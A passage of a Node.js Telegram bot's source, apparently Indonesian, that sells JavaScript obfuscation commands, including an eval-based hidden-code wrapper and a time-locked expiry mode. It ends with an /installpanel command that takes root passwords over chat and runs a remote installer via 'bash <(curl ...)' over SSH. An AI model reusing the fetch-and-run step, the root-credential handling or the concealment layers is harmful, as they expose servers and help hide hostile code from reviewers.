            " ⚙️ Memulai (Quantum Vortex Encryption) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Quantum Vortex Encryption: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan Quantum Vortex Encryption`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Quantum Vortex Encryption");
        const obfuscatedCode = await obfuscateQuantum(fileContent);
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        log(`Ukuran file setelah obfuscation: ${Buffer.byteLength(obfuscatedCode, 'utf-8')} bytes`);

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${obfuscatedCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi quantum: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `quantum-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Quantum Vortex Encryption) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Quantum Vortex Encryption Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Quantum obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /encx
bot.command("encx", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encx`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `x-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            " ⚙️ Memulai (Hardened X Invisible) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk X obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya X`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Hardened X Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getXObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation sebelum encoding (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);

        // Tambahkan lapisan invisible encoding
        const encodedInvisible = encodeInvisible(obfuscatedCode);
        const finalCode = `
        (function(){
            function decodeInvisible(encodedText) {
                if (!encodedText.startsWith('\u200B')) return encodedText;
                try {
                    return Buffer.from(encodedText.slice(1), 'base64').toString('utf-8');
                } catch (e) {
                    return encodedText;
                }
            }
            try {
                const hiddenCode = "${encodedInvisible}";
                const decodedCode = decodeInvisible(hiddenCode);
                if (!decodedCode || decodedCode === hiddenCode) throw new Error("Decoding failed");
                eval(decodedCode);
            } catch (e) {
                console.error("Execution error:", e);
            }
        })();
        `;
        log(`Hasil obfuscation dengan invisible encoding (50 char pertama): ${finalCode.substring(0, 50)}...`);
        await updateProgress(ctx, progressMessage, 60, "Transformasi Kode");

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(finalCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${finalCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, finalCode);

        log(`Mengirim file terenkripsi gaya X: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `x-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Hardened X Invisible) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Hardened X Invisible Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat X obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

// Command /encnova
bot.command("encnova", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encnova`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `nova-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            " ⚙️ Memulai (Nova Dynamic) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Nova obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Nova`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Nova Dynamic Obfuscation");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getNovaObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${obfuscatedCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Nova: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `nova-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Nova Dynamic) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Nova Dynamic Obfuscation Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Nova obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("encnebula", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encnebula`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `nebula-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            " ⚙️ Memulai (Nebula Polymorphic Storm) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Nebula obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Nebula`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Nebula Polymorphic Storm");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getNebulaObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        log(`Ukuran file setelah obfuscation: ${Buffer.byteLength(obfuscatedCode, 'utf-8')} bytes`);

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${obfuscatedCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Nebula: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `nebula-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Nebula Polymorphic Storm) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Nebula Polymorphic Storm Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Nebula obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("encsiu", async (ctx) => {
users.add(ctx.from.id);
    saveUsers(users);
    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/encsiucalcrick`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `siucalcrick-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            " ⚙️ Memulai (Calcrick Chaos Core) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Siu+Calcrick obfuscation: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan gaya Siu+Calcrick`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Calcrick Chaos Core");
        const obfuscated = await JsConfuser.obfuscate(fileContent, getSiuCalcrickObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        log(`Ukuran file setelah obfuscation: ${Buffer.byteLength(obfuscatedCode, 'utf-8')} bytes`);

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${obfuscatedCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi gaya Siu+Calcrick: ${file.file_name}`);
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `siucalcrick-encrypted-${file.file_name}` },
            { caption: "✅ *File terenkripsi (Calcrick Chaos Core) siap!*\nEncryption Success 🕊", parse_mode: "Markdown" }
        );
        await updateProgress(ctx, progressMessage, 100, "Calcrick Chaos Core Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Siu+Calcrick obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command("enclocked", async (ctx) => {
    users.add(ctx.from.id);
    saveUsers(users);

    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    const args = ctx.message.text.split(" ").slice(1);
    if (args.length !== 1 || !/^\d+$/.test(args[0]) || parseInt(args[0]) < 1 || parseInt(args[0]) > 365) {
        return ctx.replyWithMarkdown("❌ *Error:* Gunakan format `/enclocked [1-365]` untuk jumlah hari (misal: `/enclocked 7`)!");
    }

    const days = args[0];
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + parseInt(days));
    const expiryFormatted = expiryDate.toLocaleDateString();

    if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.document) {
        return ctx.replyWithMarkdown("❌ *Error:* Balas file .js dengan `/enclocked [1-365]`!");
    }

    const file = ctx.message.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return ctx.replyWithMarkdown("❌ *Error:* Hanya file .js yang didukung!");
    }

    const encryptedPath = path.join(__dirname, `locked-encrypted-${file.file_name}`);

    try {
        const progressMessage = await ctx.replyWithMarkdown(
            "```css\n" +
            "🔒 EncryptBot\n" +
            " ⚙️ Memulai (Time-Locked Encryption) (1%)\n" +
            " " + createProgressBar(1) + "\n" +
            "```\n" +
            "Processing Encryption"
        );

        const fileLink = await ctx.telegram.getFileLink(file.file_id);
        log(`Mengunduh file untuk Time-Locked Encryption: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 10, "Mengunduh");
        const response = await fetch(fileLink);
        let fileContent = await response.text();
        await updateProgress(ctx, progressMessage, 20, "Mengunduh Selesai");

        log(`Memvalidasi kode awal: ${file.file_name}`);
        await updateProgress(ctx, progressMessage, 30, "Memvalidasi Kode");
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        log(`Mengenkripsi file dengan Time-Locked Encryption`);
        await updateProgress(ctx, progressMessage, 40, "Inisialisasi Time-Locked Encryption");
        const obfuscatedCode = await obfuscateTimeLocked(fileContent, days);
        log(`Hasil obfuscation (50 char pertama): ${obfuscatedCode.substring(0, 50)}...`);
        log(`Ukuran file setelah obfuscation: ${Buffer.byteLength(obfuscatedCode, 'utf-8')} bytes`);

        log(`Memvalidasi hasil obfuscation: ${file.file_name}`);
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            log(`Detail kode bermasalah: ${obfuscatedCode.substring(0, 100)}...`);
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(ctx, progressMessage, 80, "Finalisasi Enkripsi");
        await fs.writeFile(encryptedPath, obfuscatedCode);

        log(`Mengirim file terenkripsi time-locked: ${file.file_name}`);
        await ctx.replyWithMarkdown(
            `✅ *File terenkripsi (Time-Locked Encryption) siap!*\n` +
            `⏰ Masa aktif: ${days} hari (Kedaluwarsa: ${expiryFormatted})\n` +
            `_Powered by NightCores_`,
            { parse_mode: "Markdown" }
        );
        await ctx.replyWithDocument(
            { source: encryptedPath, filename: `locked-encrypted-${file.file_name}` }
        );
        await updateProgress(ctx, progressMessage, 100, "Time-Locked Encryption Selesai");

        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus: ${encryptedPath}`);
        }
    } catch (error) {
        log("Kesalahan saat Time-Locked obfuscation", error);
        await ctx.replyWithMarkdown(`❌ *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`);
        if (await fs.pathExists(encryptedPath)) {
            await fs.unlink(encryptedPath);
            log(`File sementara dihapus setelah error: ${encryptedPath}`);
        }
    }
});

bot.command(['obf1', 'obf2', 'obf3', 'obf4', 'obf5', 'obf6', 'obf7', 'obf8'], async (ctx) => {
    users.add(ctx.from.id);
    saveUsers(users);

    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const chatId = ctx.message.chat.id;
    const method = ctx.message.text;

    await ctx.reply(`Anda memilih ${method}. Kirimkan file JavaScript yang ingin diobfuscate.`);

    // Menunggu pengguna mengirim file
    bot.on('document', async (fileCtx) => {
        if (fileCtx.message.chat.id === chatId) {
            const fileId = fileCtx.message.document.file_id;
            const fileName = fileCtx.message.document.file_name;

            if (!fileName.endsWith('.js')) {
                await ctx.reply("Format file tidak valid. Harap kirimkan file dengan ekstensi .js.");
                return;
            }

            const fileLink = await ctx.telegram.getFileLink(fileId);
            const inputFilePath = path.join(__dirname, fileName);

            const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
            fs.writeFileSync(inputFilePath, response.data);

            let resultMessage;
            let outputFilePath;

            switch (method) {
                case '/obf1':
                    outputFilePath = path.join(__dirname, 'obfuscated1.js');
                    resultMessage = await obf1(inputFilePath);
                    break;
                case '/obf2':
                    outputFilePath = path.join(__dirname, 'obfuscated2.js');
                    resultMessage = await obf2(inputFilePath);
                    break;
                case '/obf3':
                    outputFilePath = path.join(__dirname, 'obfuscated3.js');
                    resultMessage = await obf3(inputFilePath);
                    break;
                case '/obf4':
                    outputFilePath = path.join(__dirname, 'obfuscated4.js');
                    resultMessage = await obf4(inputFilePath);
                    break;
                case '/obf5':
                    outputFilePath = path.join(__dirname, 'obfuscated5.js');
                    resultMessage = await obf5(inputFilePath);
                    break;
                case '/obf6':
                    outputFilePath = path.join(__dirname, 'obfuscated6.js');
                    resultMessage = await obf6(inputFilePath);
                    break;
                case '/obf7':
                    outputFilePath = path.join(__dirname, 'obfuscated7.js');
                    resultMessage = await obf7(inputFilePath);
                    break;
                case '/obf8':
                    outputFilePath = path.join(__dirname, 'obfuscated8.js');
                    resultMessage = await obf8(inputFilePath);
                    break;
                default:
                    throw new Error("Metode tidak valid.");
            }

            fs.writeFileSync(outputFilePath, resultMessage);

            await ctx.replyWithDocument({ source: outputFilePath });

            fs.unlinkSync(inputFilePath);
            fs.unlinkSync(outputFilePath);

            // Hapus listener setelah selesai
            bot.off('document');
        }
    });
});

bot.command(['aph', 'aph2'], async (ctx) => {
    users.add(ctx.from.id);
    saveUsers(users);

    const isMember = await checkChannelMembership(ctx);
    if (!isMember) {
        return ctx.replyWithMarkdown(
            "❌ E̶R̶R̶O̶R̶ │ ⓘ ᴀɴᴅᴀ ʜᴀʀᴜs ʙᴇʀɢᴀʙᴜɴɢ ᴋᴇ ᴄʜᴀɴɴᴇʟ @ChannelSkyNemesis ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ sᴇʙᴇʟᴜᴍ ᴍᴇᴍᴀᴋᴀɪ ʙᴏᴛ ᴏʙғ ɴʏᴀ!! \n" +
            "[ᴊᴏɪɴ sᴇᴋᴀʀᴀɴɢ](https://https://t.me/ChannelSkyNemesis)"
        );
    }
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
      return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }
    const chatId = ctx.message.chat.id;
    const method = ctx.message.text;

    await ctx.reply(`Anda memilih ${method}. Kirimkan file JavaScript yang ingin diobfuscate.`);

    // Menunggu pengguna mengirim file
    bot.on('document', async (fileCtx) => {
        if (fileCtx.message.chat.id === chatId) {
            const fileId = fileCtx.message.document.file_id;
            const fileName = fileCtx.message.document.file_name;

            if (!fileName.endsWith('.js')) {
                await ctx.reply("Format file tidak valid. Harap kirimkan file dengan ekstensi .js.");
                return;
            }

            const fileLink = await ctx.telegram.getFileLink(fileId);
            const inputFilePath = path.join(__dirname, fileName);

            const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
            fs.writeFileSync(inputFilePath, response.data);

            let resultMessage;
            let outputFilePath;

            switch (method) {
                case '/aph':
                    outputFilePath = path.join(__dirname, 'obfuscated9.js');
                    resultMessage = await obfuscateWithJscrambler(inputFilePath);
                    break;
                case '/aph2':
                    outputFilePath = path.join(__dirname, 'obfuscated10.js');
                    resultMessage = await obfuscateWithJscrambler2(inputFilePath);
                    break;
                default:
                    throw new Error("Metode tidak valid.");
            }

            fs.writeFileSync(outputFilePath, resultMessage);

            await ctx.replyWithDocument({ source: outputFilePath });

            fs.unlinkSync(inputFilePath);
            fs.unlinkSync(outputFilePath);

            // Hapus listener setelah selesai
            bot.off('document');
        }
    });
})

// Perintah installpanel


// Perintah installpanel
bot.command('installpanel', (ctx) => {
  users.add(ctx.from.id);
    saveUsers(users);
    
  const text = ctx.message.text.split(' ').slice(1).join(' ');
  if (!text) {
    return ctx.reply(example());
  }

  const vii = text.split('|');
  if (vii.length < 5) {
    return ctx.reply(example());
  }

  // Simpan data pengguna
  userData[ctx.from.id] = {
    ip: vii[0],
    password: vii[1],
    domainpanel: vii[2],
    domainnode: vii[3],
    ramserver: vii[4],
    step: 'installing',
  };

  ctx.reply('Memproses instalasi server panel...\nTunggu 1-10 menit hingga proses selesai.');
  startInstallation(ctx);
});

// Fungsi instalasi
function startInstallation(ctx) {
  const userId = ctx.from.id;
  if (!userData[userId]) {
    ctx.reply('Data pengguna tidak ditemukan, silakan ulangi perintah.');
    return;
  }

  const { ip, password, domainpanel, domainnode, ramserver } = userData[userId];

  const ress = new Client();
  const connSettings = {
    host: ip,
    port: 22,
    username: 'root',
    password: password,
  };

  const passwordPanel = `admin${Math.random().toString(36).substring(7)}`; // Random password
  const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`;

  // Fungsi untuk instal wings
  const installWings = (conn) => {
    conn.exec(commandPanel, (err, stream) => {
      if (err) {
